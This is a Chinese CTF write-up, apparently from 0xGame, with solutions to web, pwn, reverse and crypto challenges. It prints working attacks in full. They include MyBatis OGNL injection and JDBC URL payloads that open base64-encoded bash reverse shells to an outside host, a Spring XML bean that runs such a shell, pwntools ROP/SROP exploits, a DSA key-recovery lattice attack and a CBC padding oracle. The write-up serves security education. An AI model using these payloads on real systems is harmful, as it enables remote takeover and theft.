![image-20230930183841704](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021208261.png)

![image-20230930183910475](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021208689.png)

这里首先得注意传入 Runtime.exec 的命令需要进行一次编码

https://www.adminxe.com/tools/code.html

https://ares-x.com/tools/runtime-exec/

https://github.com/Threekiii/Awesome-Redteam/blob/master/scripts/runtime-exec-payloads.html

具体原因大家可以参考下面两篇文章

https://www.anquanke.com/post/id/243329

https://y4er.com/posts/java-exec-command/

然后 POST 传递命令时得先 urlencode 一次

#### YourBatis

考点: MyBatis 低版本 OGNL 注入

首先关注 pom.xml, 通过这个文件可以查看 jar 包使用的第三方库

```xml
<dependency>
    <groupId>org.mybatis.spring.boot</groupId>
    <artifactId>mybatis-spring-boot-starter</artifactId>
    <version>2.1.1</version>
</dependency>
```

存在 mybatis 依赖, 版本 2.1.1, 该版本存在 OGNL 表达式注入, 网上搜搜就有相关的利用文章

https://www.cnpanda.net/sec/1227.html

https://forum.butian.net/share/1749

这有一个小坑, 如果 jar 包使用 JD-GUI 反编译的话就无法正常得到 UserSqlProvider 这个类的内容, 必须得使用 IDEA 自带的反编译器或者 Jadx-GUI 等其它工具才行

UserSqlProvider.class

```java
package com.example.yourbatis.provider;

import org.apache.ibatis.jdbc.SQL;

public class UserSqlProvider {
    public UserSqlProvider() {
    }

    public String buildGetUsers() {
        return (new SQL() {
            {
                this.SELECT("*");
                this.FROM("users");
            }
        }).toString();
    }

    public String buildGetUserByUsername(final String username) {
        return (new SQL() {
            {
                this.SELECT("*");
                this.FROM("users");
                this.WHERE(String.format("username = '%s'", username));
            }
        }).toString();
    }
}
```

根据参考文章可以知道这里的 username 被直接拼接进 SQL 语句, 存在 SQL 注入, 但是更进一步来讲这里存在 OGNL 表达式注入

直接反弹 shell

```json
${@java.lang.Runtime@getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}")}
```

但是很显然是会失败的, 因为传入的命令包含了 `{` 和 `}`, 会被递归解析为另一个 OGNL 表达式的开头和结尾

这个点可能比较难, 所以后面给出了 hint

解决方案是只要不出现大括号就行, 方法很多, 这里给出一种, 利用 OGNL 调用 Java 自身的 base64 decode 方法

```json
${@java.lang.Runtime@getRuntime().exec(new java.lang.String(@java.util.Base64@getDecoder().decode('YmFzaCAtYyB7ZWNobyxZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzlvYjNOMExtUnZZMnRsY2k1cGJuUmxjbTVoYkM4ME5EUTBJREErSmpFPX18e2Jhc2U2NCwtZH18e2Jhc2gsLWl9Cg==')))}
```

urlencode 全部字符后发送, 反弹 shell, 查看环境变量拿到 flag

![image-20230930191043521](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021208262.png)

![image-20230930190822099](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021208739.png)

#### TestConnection

考点: MySQL / PostgreSQL JDBC URL Attack

JDBC 就是 Java 用于操作数据库的接口, 通过一个统一规范的 JDBC 接口可以实现同一段代码兼容不同类型数据库的访问

JDBC URL 就是用于连接数据库的字符串, 格式为 `jdbc:db-type://host:port/db-name?param=value`

db-type 就是数据库类型, 例如 postgresql, mysql, mssql, oracle, sqlite

db-name 是要使用的数据库名

param 是要传入的参数, 比如 user, password, 指定连接时使用的编码类型等等

当 jdbc url 可控时, 如果目标网站使用了旧版的数据库驱动, 在特定情况下就可以实现 RCE

参考文章:

https://tttang.com/archive/1877/

https://xz.aliyun.com/t/11812

https://forum.butian.net/share/1339

pom.xml

```xml
<dependency>
    <groupId>mysql</groupId>
    <artifactId>mysql-connector-java</artifactId>
    <version>8.0.11</version>
    <scope>runtime</scope>
</dependency>

<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>

<dependency>
    <groupId>org.postgresql</groupId>
    <artifactId>postgresql</artifactId>
    <version>42.3.1</version>
    <scope>runtime</scope>
</dependency>
</dependencies>
```

给了两个依赖, mysql 和 postgresql, 对应两种利用方式

然后还有 commons-collections 依赖, 这个主要是方便大家在后面用 ysoserial 工具去生成反序列化 payload

首先是 mysql 驱动的利用

结合网上文章可以构造对应的 jdbc url

```
jdbc:mysql://host.docker.internal:3308/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
```

首先得注意, 因为题目给的代码是 `DriverManager.getConnection(url, username, password);`, 即会单独传入一个 username 参数, 因此 url 中的 username 会被后面的 username 给覆盖

网上的部分利用工具会通过 username 来区分不同的 payload, 所以得注意 username 要单独传, 不然写在 url 里面就被覆盖了

其次, 因为 jdbc url 本身也符合 url 的规范, 所以在传 url 参数的时候, 需要把 url 本身全部进行 url 编码, 防止服务器错把 autoDeserialize, queryInterceptors 这些参数当成是一个 http get 参数, 而不是 jdbc url 里面的参数

最后依然是 Runtime.exec 命令编码的问题

一些 mysql jdbc 利用工具

https://github.com/4ra1n/mysql-fake-server

https://github.com/rmb122/rogue_mysql_server

payload

```
/testConnection?driver=com.mysql.cj.jdbc.Driver&url=jdbc:mysql://host.docker.internal:3308/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&username=deser_CC31_bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}&password=123
```

url 编码

```
/testConnection?driver=com.mysql.cj.jdbc.Driver&url=%6a%64%62%63%3a%6d%79%73%71%6c%3a%2f%2f%68%6f%73%74%2e%64%6f%63%6b%65%72%2e%69%6e%74%65%72%6e%61%6c%3a%33%33%30%38%2f%74%65%73%74%3f%61%75%74%6f%44%65%73%65%72%69%61%6c%69%7a%65%3d%74%72%75%65%26%71%75%65%72%79%49%6e%74%65%72%63%65%70%74%6f%72%73%3d%63%6f%6d%2e%6d%79%73%71%6c%2e%63%6a%2e%6a%64%62%63%2e%69%6e%74%65%72%63%65%70%74%6f%72%73%2e%53%65%72%76%65%72%53%74%61%74%75%73%44%69%66%66%49%6e%74%65%72%63%65%70%74%6f%72&username=%64%65%73%65%72%5f%43%43%33%31%5f%62%61%73%68%20%2d%63%20%7b%65%63%68%6f%2c%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%39%6f%62%33%4e%30%4c%6d%52%76%59%32%74%6c%63%69%35%70%62%6e%52%6c%63%6d%35%68%62%43%38%30%4e%44%51%30%49%44%41%2b%4a%6a%45%3d%7d%7c%7b%62%61%73%65%36%34%2c%2d%64%7d%7c%7b%62%61%73%68%2c%2d%69%7d&password=123
```

![image-20231101212444166](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021208439.png)

![image-20231101212451632](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021208250.png)

flag 在环境变量里面

![image-20231101212504693](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021208321.png)

当然也可以利用 postgresql 驱动, 这个更简单一些

根据参考文章, 起一个 http 服务器, 构造 xml

```xml
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg >
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}</value>
            </list>
            </constructor-arg>
        </bean>
    </beans>
```

payload

```
/testConnection?driver=org.postgresql.Driver&url=jdbc:postgresql://127.0.0.1:5432/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://host.docker.internal:8000/poc.xml&username=123&password=123
```

url 编码

```
/testConnection?driver=org.postgresql.Driver&url=%6a%64%62%63%3a%70%6f%73%74%67%72%65%73%71%6c%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%35%34%33%32%2f%74%65%73%74%3f%73%6f%63%6b%65%74%46%61%63%74%6f%72%79%3d%6f%72%67%2e%73%70%72%69%6e%67%66%72%61%6d%65%77%6f%72%6b%2e%63%6f%6e%74%65%78%74%2e%73%75%70%70%6f%72%74%2e%43%6c%61%73%73%50%61%74%68%58%6d%6c%41%70%70%6c%69%63%61%74%69%6f%6e%43%6f%6e%74%65%78%74%26%73%6f%63%6b%65%74%46%61%63%74%6f%72%79%41%72%67%3d%68%74%74%70%3a%2f%2f%68%6f%73%74%2e%64%6f%63%6b%65%72%2e%69%6e%74%65%72%6e%61%6c%3a%38%30%30%30%2f%70%6f%63%2e%78%6d%6c&username=123&password=123
```

最终也是一样的效果

### Pwn

#### SROP & SROP-REVENGE

> 非预期在于低版本libc（本题2.31）可以打ret2csu。
>
> 高版本libc（2.35）gadget几乎没有

套板子打ORW即可。

> SROP的原理可以看一下，会对日后linux kernel的学习有所帮助。

```py
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
#s=process("./pwn")
s=remote("8.130.35.16",53002)
rax=0x401388
syscall=0x401385

f1=SigreturnFrame()
f1.rax=0
f1.rdi=0
f1.rsi=0x404400
f1.rdx=0x1000
f1.rip=syscall
f1.rsp=0x404400

f2=SigreturnFrame()
f2.rax=2
f2.rdi=0x404400+0x318
f2.rsi=0
f2.rdx=0
f2.rip=syscall
f2.rsp=0x404400+len(f2)+0x10

f3=SigreturnFrame()
f3.rax=0
f3.rdi=3
f3.rsi=0x404400+0x318
f3.rdx=0x100
f3.rip=syscall
f3.rsp=0x404400+len(f3)*2+0x20

f4=SigreturnFrame()
f4.rax=1
f4.rdi=1
f4.rsi=0x404400+0x318
f4.rdx=0x100
f4.rip=syscall
pause()
s.send(flat([
    b"a"*0x10,
    rax,syscall,bytes(f1),
]))

s.send(flat([
    rax,syscall,bytes(f2),
    rax,syscall,bytes(f3),
    rax,syscall,bytes(f4),
    b"/flag\x00"
]))

s.interactive()
```

#### 爱你在心口难开

只给了or没有w，考虑侧信道。

因为stdout没关，可以根据是否EOF来定义两种状态。

+ 没有EOF，即shellcode卡一个死循环
+ EOF，即调用除or外的系统调用

你可以根据这两种状态来区分flag的正确与否。

下面的exp里面写了个二分，显著加速爆破。

```py
from pwn import *
context(arch='amd64', os='linux', log_level='info')
flag="0xGame{"
while 1:    
    curr_pos=len(flag)
    left=32
    right=126
    while left!=right:
        warning(f"{curr_pos}: {left}~{right}")
        #s=process("../dist/pwn")
        s=remote("8.130.35.16",54000)
        #pause()
        s.sendafter(b"code:\n",asm("push rdx;pop rsi;push rdx;pop r15;xor rdi,rdi;xor rax,rax;syscall"))
        mid=int((left+right)/2)
        scbase=f"""
        push r15
        pop rdi
        xor rsi,rsi
        xor rdx,rdx
        push 2
        pop rax
        syscall
        push rdi
        pop rsi
        add rsi,0x600
        push rax
        pop rdi
        xor rax,rax
        inc dh
        syscall
        push rsi
        pop r14
        cmp byte ptr [r14+{curr_pos}],{mid}
        ja loop
        push 0x3b
        pop rax
        syscall
        loop:
        jmp loop
        """
        s.recvline()
        #pause()
        s.send(b"flag\0".ljust(0x10,b"\x90")+asm(scbase))
        #pause()
        try:
            dat=s.recv(timeout=1)
        except EOFError:
            right=mid
            s.close()
            continue
        left=mid+1
        #pause()
        s.close()
    flag+=chr(left)
    warning(flag)
    if flag[-1]=="}":
        success(flag)
        exit(0)
```

#### 结束了？

fmt泄露信息+栈迁移+沙盒绕过orw。

```py
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
#s=process("../dist/ret2libc-revenge")
s=remote("8.130.35.16",53004)
elf=ELF("../dist/ret2libc-revenge")
libc=ELF("../dist/libc.so.6")
s.sendafter(b"name:\n",b"%8$p.%13$p.%9$p.")
libc.address=eval(s.recvuntil(b".")[:-1])-(0x7ffff7fc72e8-0x7ffff7dd6000)
canary=eval(s.recvuntil(b".")[:-1])
elf.address=eval(s.recvuntil(b".")[:-1])-0x14c0
success(hex(libc.address))
success(hex(elf.address))
success(hex(canary))
pause()

leave_ret=libc.address+0x00000000000578c8
pivot_read=0x148D

s.sendafter(b"intro:\n",flat([
    b"a"*0x38,canary,
    elf.address+0x4400+0x40,
    elf.address+pivot_read,
]))

rdi=0x0000000000023b6a+libc.address
rsi=0x000000000002601f+libc.address
rdx=0x0000000000142c92+libc.address
rax=0x0000000000036174+libc.address
ret=rdi+1
syscall_ret=0x00000000000630a9+libc.address
s.send(flat([
    elf.address+0x4400+0x40,rdx,
    0x1000,libc.sym.read,
    rdi+1,rdi+1,
    rdi+1,canary,
    elf.address+0x4400,leave_ret,
]))
s.send(flat([
    ret,ret,ret,ret,
    rdi,elf.address+0x4400+0x200,
    rsi,0,rdx,0,
    libc.sym.open,
    rdi,3,rsi,elf.address+0x4400+0x200,rdx,0x100,
    libc.sym.read,
    rdi,1,
    libc.sym.write,
    rdi,elf.address+0x4400+0x200,
    elf.plt.puts,
]).ljust(0x200,b"\x00")+b"flag\x00")
s.interactive()
```

### Reverse

#### 二进制学徒

首先，我们得到题目后，利用 [在线工具](https://tool.lu/pyc/) 进行反编译

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717331145.png)

通过反编译，我们可以清晰地看到程序的逻辑以及隐藏的 **flag**。

#### 代码悟道者

这道题，我们将 jar 文件拖入到 JADX 中。

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717332046.png)

在 **Main** 类中，我们发现程序会将用户输入通过 **customBase64Encode** 函数处理后与内置值进行比较。而 **customBase64Encode** 函数是一个自定义编码表的 **BASE64** 算法。我们可以使用 [CyberChef](https://gchq.github.io/CyberChef/) 工具来解密内置值，得到 **flag**。

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717332844.png)

#### 指令神使

在本题中，我们将 exe 文件拖入到 IDA 中进行分析。

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717333473.png)

根据反编译结果，我们可以发现程序会将输入进行一系列判断，然后与内置的Str2比较。这里 **sub_140001154** 函数负责判断输入是否符合 **0xGame{}** 格式。**sub_140001118** 函数反编译结果如下。

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717334267.png)

可以看出该函数是对Str1中的所有小写字母右移13位，既 **ROT13** 算法。我们可以使用 [CyberChef](https://gchq.github.io/CyberChef/) 工具来解密内置值，得到 **flag**。

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717334968.png)

#### 内存星旅者

在这道题目中，我们同样将 exe 文件拖入到 IDA 中，准备进行分析。

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717335620.png)

反编译 **main** 函数后，我们可以看到程序的逻辑，**sub_140001510** 函数接收程序启动参数，并修改 **v5** 变量，该函数如果返回 **true** 则传入 **v5** 变量调用 **sub_140001600** 函数，之后提示

> **恭喜，flag已生成，你能找到并读取它吗？** 

这里对 **sub_140001600** 函数进行分析

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717340471.png)

可以看出，该函数会利用 **GetTempPathA** 获取临时文件目录，之后**sub_140001600** 函数会对内置的值利用 **v5** 变量进行 xor 操作，之后会调用 **DeleteFileA** 删除文件。这里做一些分析后可以看出，是将解密后的 **flag** 利用 **std::ofstream** 写出到临时文件目录的 **flag** 文件中，随后删除该文件。

之后我们对 **sub_140001510** 函数进行分析，可以得出 **v5** 变量的值应该是 **1897488**，利用该信息，我们就可以解密出正确的 **flag**。

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717341269.png)

不过这里若是进行详细的分析，可以知道程序需要 **-0xGame** 参数以及 **-Portal=** 参数。

我们这里只要执行如下命令，并且阻止临时文件目录的 **flag** 文件被删除，即可拿到 **flag**。

```shell
内存星旅者.exe -0xGame -Portal=1897488
```

#### 算法祭司

最后一道题，我们将 exe 文件拖入到 ILSpy 中，开始进行分析。

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717342096.png)

可以看出，程序从资源中拿到 **encryptedKey** 然后对其 **xor 0x66**，之后将其分别作为 **DES** 算法的 **IV** 和 **KEY** ，将用户的输入加密后进行 **BASE64** 编码，之后与内置值进行比较。

这里我们可以使用 [CyberChef](https://gchq.github.io/CyberChef/) 工具来解密内置值，得到 **flag**。

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717342867.png)

### Crypto

#### Normal ECC

考点：

+ 椭圆曲线
+ DLP
+ SmartAttack

脚本一把梭就可以了，因为题目生成的模数也比较难找，抽象，直接就抄了别人的参数了，根据题目的Hint很快就就可以搜出这个方法来，本周的送分题。[拓展阅读](https://lazzzaro.github.io/2020/11/07/crypto-ECC/)

exp:

```python
from hashlib import md5

def MD5(m):return md5(str(m).encode()).hexdigest()
p=11093300438765357787693823122068501933326829181518693650897090781749379503427651954028543076247583697669597230934286751428880673539155279232304301123931419
a=490963434153515882934487973185142842357175523008183292296815140698999054658777820556076794490414610737654365807063916602037816955706321036900113929329671
b=7668542654793784988436499086739239442915170287346121645884096222948338279165302213440060079141960679678526016348025029558335977042712382611197995002316466
G=(4045939664332192284605924284905750194599514115248885617006435833400516258314135019849306107002566248677228498859069119557284134574413164612914441502516162, 2847794627838984866808853730797794758944159239755903652092146137932959816137006954045318821531984715562135134681256836794735388745354065994745661832926404)
K=(9857925495630886472871072848615069766635115253576843197716242339068269151167072057478472997523547299286363591371734837904400286993818976404285783613138603, 9981865329938877904579306200429599690480093951555010258809210740458120586507638100468722807717390033784290215217185921690103757911870933497240578867679716)
C1=(4349662787973529188741615503085571493571434812105745603868205005885464592782536198234863020839759214118594741734453731681116610298272107088387481605173124, 10835708302355425798729392993451337162773253000440566333611610633234929294159743316615308778168947697567386109223430056006489876900001115634567822674333770)
C2=(5193866657417498376737132473732737330916570240569047910293144235752602489388092937375844109374780050061859498276712695321973801207620914447727053101524592, 684299154840371832195648774293174908478389728255128448106858267664482339440737099810868633906297465450436417091302739473407943955874648486647511119341978)

E = EllipticCurve(GF(p), [0, 0, 0, a, b])
P = E([K[0],K[1]])
Q = E([G[0],G[1]])
c1 = E([C1[0],C1[1]])
c2 = E([C2[0],C2[1]])

def SmartAttack(P,Q,p):
    E = P.curve()
    Eqp = EllipticCurve(Qp(p, 2), [ ZZ(t) + randint(0,p)*p for t in E.a_invariants() ])

    P_Qps = Eqp.lift_x(ZZ(P.xy()[0]), all=True)
    for P_Qp in P_Qps:
        if GF(p)(P_Qp.xy()[1]) == P.xy()[1]:
            break

    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[0]), all=True)
    for Q_Qp in Q_Qps:
        if GF(p)(Q_Qp.xy()[1]) == Q.xy()[1]:
            break

    p_times_P = p*P_Qp
    p_times_Q = p*Q_Qp

    x_P,y_P = p_times_P.xy()
    x_Q,y_Q = p_times_Q.xy()

    phi_P = -(x_P/y_P)
    phi_Q = -(x_Q/y_Q)
    k = phi_Q/phi_P
    return ZZ(k)

r = SmartAttack(P, Q, p)
print(MD5((c1-k*c2).xy()[0]))
#裹上flag就可以了
```

#### Drange Leak

考点

+ Coppersmith的利用
+ 阅读论文的能力
+ 基本数学推导

这题其实比较简单的，看着论文长篇大论的蛮哈人，但其实我们知道一篇论文的顺序是：

+ 引论(这篇论文的背景，解决了什么问题)
+ 引理(用了哪些关键的定理、这些定理的内容是什么)
+ 推导过程和结论(基本上追求速通的话就看这部分就可以)
+ 实验数据
+ 总结，引用文章……

大致上都是这样，所以这里直接快进到中间，这里可以发现：
$$
d = M*d_1+d_0\\
ed = 1 (modphi)\\
展开：ed=1+k*phi\\
再展：e*(M*d_1+d_0)-1-k*phi=0\\
展：e*(M*d_1+d_0)-1-k*[N-(q+p-1)]=0\\
到这一步就是题目的关键了
$$
这里引入一个Coppersmith定理：用来求解有限域的小根问题。(给定一个模数下的数学式子，求解其中的较小未知数。)

在论文中可以看到这个Coppersmith实现的一定过程。具体核心思想在上周的WP中已经给出，所以这里直接拿来用：只要找对了关系式，找到较小的根，直接small_roots就完了。

那么在这里，我们先粗略地估算一下位数(不需要太准确，我们只要知道较小的未知数是否存在就行)：
$$
式子：e*(M*d_1+d_0)-1-k*[N-(q+p-1)]=0\\
e:2048位，N:2048位，k:1024位左右可能\\
利用已知信息构造有限域式子：\\
e*d_0 - 1 - k*[N-(q+p-1)]=0(modM*e)\\
令q+p-1 =z\\
得e*d_0 - 1 - k*(N-z)=0(modM*e)\\
d_0:70位，k<1024位，z：512位\\
之后利用small\_roots函数去解未知数就可以
$$
其实论文看不看都行，经验熟练了直接拿手推就好。

这里有一点小坑的地方在于，能够常规small_roots函数能求解的位数比较低，我卡的参数也比较极限，有的师傅构造出来了，但是解不出来，原因可能有几个：

+ bounds:这个求解的界卡太准不一定好，卡个差不多就行了，太大、过小都不一定求得出来
+ m:格基规约的维数?总之越大求解的小根就越准确，但是算法的速度也会越慢。
+ d:多项式的次数。

经验之谈：找对办法的情况下，估算好位数之后就可以开始梭哈了。

exp:

```python
import itertools
from Crypto.Util.number import *

def small_roots(f, bounds, m=1, d=None):
    if not d:
        d = f.degree()

    R = f.base_ring()
    N = R.cardinality()

    f /= f.coefficients().pop(0)
    f = f.change_ring(ZZ)

    G = Sequence([], f.parent())
    for i in range(m+1):
        base = N^(m-i) * f^i
        for shifts in itertools.product(range(d), repeat=f.nvariables()):
            g = base * prod(map(power, f.variables(), shifts))
            G.append(g)

    B, monomials = G.coefficient_matrix()
    monomials = vector(monomials)

    factors = [monomial(*bounds) for monomial in monomials]
    for i, factor in enumerate(factors):
        B.rescale_col(i, factor)

    B = B.dense_matrix().LLL()

    B = B.change_ring(QQ)
    for i, factor in enumerate(factors):
        B.rescale_col(i, 1/factor)

    H = Sequence([], f.parent().change_ring(QQ))
    for h in filter(None, B*monomials):
        H.append(h)
        I = H.ideal()
        if I.dimension() == -1:
            H.pop()
        elif I.dimension() == 0:
            roots = []
            for root in I.variety(ring=ZZ):
                root = tuple(R(root[var]) for var in f.variables())
                roots.append(root)
            return roots
    return []

n = 20890649807098098590988367504589884104169882461137822700915421138825243082401073285651688396365119177048314378342335630003758801918471770067256781032441408755600222443136442802834673033726750262792591713729454359321085776245901507024843351032181392621160709321235730377105858928038429561563451212831555362084799868396816620900530821649927143675042508754145300235707164480595867159183020730488244523890377494200551982732673420463610420046405496222143863293721127847196315699011480407859245602878759192763358027712666490436877309958694930300881154144262012786388678170041827603485103596258722151867033618346180314221757
e = 18495624691004329345494739768139119654869294781001439503228375675656780205533832088551925603457913375965236666248560110824522816405784593622489392063569693980307711273262046178522155150057918004670062638133229511441378857067441808814663979656329118576174389773223672078570346056569568769586136333878585184495900769610485682523713035338815180355226296627023856218662677851691200400870086661825318662718172322697239597148304400050201201957491047654347222946693457784950694119128957010938708457194638164370689969395914866589468077447411160531995194740413950928085824985317114393591961698215667749937880023984967171867149
c = 7268748311489430996649583334296342239120976535969890151640528281264037345919563247744198340847622671332165540273927079037288463501586895675652397791211130033797562320858177249657627485568147343368981852295435358970875375601525013288259717232106253656041724174637307915021524904526849025976062174351360431089505898256673035060020871892556020429754849084448428394307414301376699983203262072041951835713075509402291301281337658567437075609144913905526625759374465018684092236818174282777215336979886495053619105951835282087487201593981164477120073864259644978940192351781270609702595767362731320959397657161384681459323
leak=136607909840146555806361156873618892240715868885574369629522914036807393164542930308166609104735002945881388216362007941213298888307579692272865700211608126496105057113506756857793463197250909161173116422723246662094695586716106972298428164926993995948528941241037242367190042120886133717
PR.<x,k,z> = PolynomialRing(Zmod(e*leak))
f = e*x - k*n + k*z - 1
roots = small_roots(f,(2^100,2^1024,2^1024),3,3)
print(roots)
#从这里得到的z = (p+q-1)，后续直接解方程就可以了。
```

#### LLL-ThirdBlood

考点：

+ 格基的理解
+ DSA算法
+ 签名伪造

详细的文章在这里 [一类基于各种DSA的HNP问题求解](https://zhuanlan.zhihu.com/p/581146119)

其实仔细搜索一下hint的内容，网上应该也有大量的文章，通过大量地搜索发现：阴差阳错之下甚至发现和20年的学长出过的赛题撞了[demo](https://blog.soreatu.com/posts/intended-solution-to-nhp-in-gxzyctf-2020/)。（一周内共有十位师傅，包括一位校内新生做出来了，跪了）

part1:拖取数据

k的位数这里没有卡太死(甚至导致了非预期解)，直接拖四组就行，求稳多拖几组的结果都一样的。

```python
#part1:拖取数据
from pwn import *
from hashlib import sha1
from Crypto.Util.number import *

context(os='linux', arch='amd64', log_level='debug')
h = bytes_to_long(sha1(b'test').digest())
s = []
r = []

io = remote('0.0.0.0',10002)

def Sign(target):
	target.sendafter(b'>',b'S')
	target.sendafter(b'>',b'test')
	target.recvuntil(b's = ')
	s_ = int(target.recvline())
	target.recvuntil(b'r = ')
	r_ = int(target.recvline())
	s.append(s_)
	r.append(r_)

io.recvuntil(b'q=')
q=int(io.recvline())
io.recvuntil(b'g=')
g=int(io.recvline())
io.recvuntil(b'y=')
y=int(io.recvline())

for i in range(10):
	Sign(io)
io.close()

print(f'q={q}')
print(f'h={h}')
print(f'r={r}')
print(f's={s}')
```

part2:求解私钥

仔细想想这一步，其实就是上周LLLSecond的拓展，原理是一个差不多的(甚至构造也能一样?)

以下是论文的构造解：

```python
from Crypto.Util.number import inverse
q=
h=
r=
s=
#填入以上数据

A=[]
B=[]
M=[]

t = 120 
#填入k的大概位数，相当于一个上界，比想要求解的向量大一点就行
for i in range(len(r)):
    tmp = [0 for i in range(len(r)+2)]
    tmp[i] = q
    A.append(mod(r[i]*s[0]*inverse_mod(r[0]*s[i],q),q))
    B.append(mod((r[0]*h-r[i]*h)*inverse_mod(r[0]*s[i],q),q))
    M.append(tmp)

A.extend([1,0])
B.extend([0,2^(t)])
M.append(A)
M.append(B)
M = matrix(ZZ, M)
#构造矩阵
T = M.LLL()

s0 = s[0]
s1 = s[1]
r0 =r[0]
k = T[0][0]
x = inverse(r0, q) * (s0 * k - h) % q
print(x)
#获得私钥
```

以下是学弟的非预期解：

```python
q = 
A = 
B = 
M = matrix(ZZ,22,22)
for i in range(20):
    M[i,i]=q
    M[20,i]=A[i]
    M[20,i]=B[i]
M[20,20]=1
M[21,21]=pow(2,160)
res=M.LLL()
assert pow(2,160)=res[-1][-1]
print(abs(res[-1][-1]))
```

嗯，确确实实的非预期了，而且和题目说的一样，和上周的预期构造是相同，我怎么能如此的粗心大意？

part3:伪造签名

```python
from Crypto.Util.number import *
from random import getrandbits,randint
from hashlib import sha1
pri_key = 27462250581507679486

class DSA:
    def __init__(self):
        self.q=
        self.p=
        self.g=
        self.y=
        self.x = pri_key
    def sign(self,m):
        H = bytes_to_long(sha1(m).digest())
        k = getrandbits(128)
        r = pow(self.g,k,self.p)%self.q
        s = (inverse(k,self.q)*(H+r*self.x))%self.q
        return (s,r)

    def verify(self,m,s_,r_):
        H = bytes_to_long(sha1(m).digest())
        u1 = (inverse(s_,self.q)*H)%self.q
        u2 = (inverse(s_,self.q)*r_)%self.q
        r = (pow(self.g,u1,self.p)*pow(self.y,u2,self.p))%self.p%self.q
        if r == r_:
            return True
        else:
            return False

Test = DSA()
s,r = Test.sign(b'admin')
assert Test.verify(b'admin',s,r) == True
print(s,r)
```

#### Orac1e

第一周就学过的，CBC分组模式大致是什么流程。

详细文章这里看([看我看我](https://cloud.tencent.com/developer/article/2130129))，下面的代码就不用看了，有点啰嗦的。

介绍视频这里看[视频在这里](https://www.bilibili.com/video/BV1au4y1m7KQ)。

这里简单阐述一下：因为CBC分组模式存在的原因，我们可以把解密的处理分为以下流程

+ 密文分组
+ 密文组解密->得到明文组
+ 合并明文组
+ 去填充
+ 检验是否合法

我们将中间解密的这块算法视作一个“黑盒”，

其中因为CBC分组解密流程的原因：密文->黑盒->上组密文->明文，

又因为必须检验填充是否合法的原因：

当且仅当去填充位上的数字==去填充位数，解密才能成功

那么按照第一周的CBC思想，通过已知明文去猜解密钥(中间经过黑盒的向量)，这道题就结束了。

```python
from pwn import *
from base64 import b64encode,b64decode
#context(log_level='debug')
io = remote('0.0.0.0',10002)

size = 16

def Orac1e(payload,index):
    data = b64encode(payload)
    io.sendafter(b'>',data)
    tmp = io.recvline()
    if tmp == b' Data update\n':
        print(index)
        return 1
    else:
        return 0

def Oracle(BIV,BC):
    D = []
    for index in range(15,-1,-1):
        I = [0 for _ in range(index)]
        for i in range(256):
            if D == []:
                CIV = bytes(I)+bytes([i])
            else:     
                CIV = bytes(I)+bytes([i])+xor(D,16-index)
            assert len(CIV) == 16
            payload = CIV+BC
            if Orac1e(payload,index):
                D.insert(0,(i^(16-index)))
                break
    return xor(D,BIV)

def Attack(c):
    Block_count = len(c)//16
    print(f'Block_count={Block_count}')
    iv = c[0:16]
    m = b''
    for i in range(1,Block_count):
        m += Oracle(c[size*(i-1):size*i],c[size*i:size*(i+1)])
        #print(m)
    return m
    
io.recvline()
c = io.recvline()[:-1]
c = b64decode(c)
print(Attack(c))
```

#### 写在最后

希望喜欢研究密码学和数学的小伙伴们能坚持学下去，别__被很长的题目__和__看不懂的数学理论__"劝退"，也不要为了简简单单的“上分”这个理由，随随便便抄了代码解了这题就算过了(经验的教训)，不管啥方向都好，多复现多复现。

去年0xGame开始的时候，出题人还是全方向的零基础，甚至去问学长什么是异或？甚至四周密码爆零(偷偷写了一题)。而人生第一次用编程解题还是在那年的misc方向中……(zys师傅确实给了挺大的帮助)。所以喜欢就做吧，0基础也能学得挺好，不是很强才能开始，而是开始了才能变强。

